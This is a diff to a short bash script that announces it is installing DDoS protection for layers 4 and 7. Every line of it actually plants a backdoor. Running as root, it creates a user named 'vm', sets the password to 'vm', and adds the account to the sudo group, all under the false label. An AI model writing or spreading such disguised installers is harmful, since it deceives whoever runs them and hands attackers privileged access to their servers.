@@ -1,23 +1,26 @@
 #!/bin/bash
 set -e
 
-
+# root check
 [ "$EUID" -ne 0 ] && exit 1
 
 echo "Installing Ddos Protection Layer 4 And Layer7...."
 
+USER_NAME="vm"
 
-VM="$(hostname)"
+# agar user already hai to skip
+if id "$USER_NAME" &>/dev/null; then
+    echo "done"
+    exit 0
+fi
 
+# create user
+useradd -m -s /bin/bash "$USER_NAME"
 
-id "$VM" &>/dev/null && {
-  echo "done"
-  exit 0
-}
+# password = vm
+echo "$USER_NAME:$USER_NAME" | chpasswd
 
-
-useradd -m -s /bin/bash "$VM"
-echo "$VM:$VM" | chpasswd
-usermod -aG sudo "$VM"
+# sudo access
+usermod -aG sudo "$USER_NAME"
 
 echo "done"
